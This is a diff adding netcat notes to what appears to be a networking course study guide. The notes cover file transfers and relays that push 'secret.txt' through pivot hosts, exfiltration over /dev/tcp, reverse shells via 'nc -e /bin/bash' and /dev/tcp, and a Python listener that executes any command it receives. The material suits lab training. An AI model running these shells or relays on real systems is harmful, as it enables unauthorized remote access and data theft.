@@ -66,6 +66,148 @@ password:    password:
 ```$ proxychains scp secretstuff.txt student@localhost:```
 
 
+## NETCAT
+### NETCAT: Client to Listener file transfer
+- Listener (receive file):
+```nc -lvp 9001 > newfile.txt```
+- Client (sends file):
+```nc 172.16.82.106 9001 < file.txt```
+
+
+### NETCAT: Listener to Client file transfer
+- Listener (sends file):
+```nc -lvp 9001 < file.txt```
+- Client (receive file):
+```nc 172.16.82.106 9001 > newfile.txt```
+
+
+### NETCAT Relay Demos
+> Listener - Listener
+- On Blue_Host-1 Relay:
+```
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+```
+- On Internet_Host (send):
+```$ nc 172.16.82.106 1111 < secret.txt```
+- On Blue_Priv_Host-1 (receive):
+```$ nc 192.168.1.1 3333 > newsecret.txt```
+
+
+### NETCAT Relay Demos
+> Client - Client
+- On Internet_Host (send):
+```$ nc -lvp 1111 < secret.txt```
+- On Blue_Priv_Host-1 (receive):
+```$ nc -lvp 3333 > newsecret.txt```
+- On Blue_Host-1 Relay:
+```
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+```
+
+### NETCAT Relay Demos
+> Client - Listener
+- On Internet_Host (send):
+```$ nc -lvp 1111 < secret.txt```
+- On Blue_Priv_Host-1 (receive):
+```$ nc 192.168.1.1 3333 > newsecret.txt```
+- On Blue_Host-1 Relay:
+```
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
+```
+
+### NETCAT Relay Demos
+> Listener - Client
+- On Internet_Host (send):
+```$ nc 172.16.82.106 1111 < secret.txt```
+- On Blue_Priv_Host-1 (receive):
+```$ nc -lvp 3333 > newsecret.txt```
+- On Blue_Host-1 Relay:
+```
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+```
+
+### File Transfer with /dev/tcp
+- On the receiving box:
+```$ nc -lvp 1111 > devtcpfile.txt```
+- On the sending box:
+```$ cat secret.txt > /dev/tcp/10.10.0.40/1111```
+- This method is useful for a host that does not have NETCAT available.
+
+
+## Reverse Shells
+https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_3_reverse_shells
+
+
+### Reverse shell using NETCAT
+- First listen for the shell on your device.
+```$ nc -lvp 9999```
+- On Victim using -c :
+```$ nc -c /bin/bash 10.10.0.40 9999```
+- On Victim using -e :
+```$ nc -e /bin/bash 10.10.0.40 9999```
+
+
+
+### Reverse shell using /DEV/TCP
+- First listen for the shell on your device.
+```$ nc -lvp 9999```
+- On Victim:
+```$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1```
+
+
+### Reverse shell Python3
+```
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
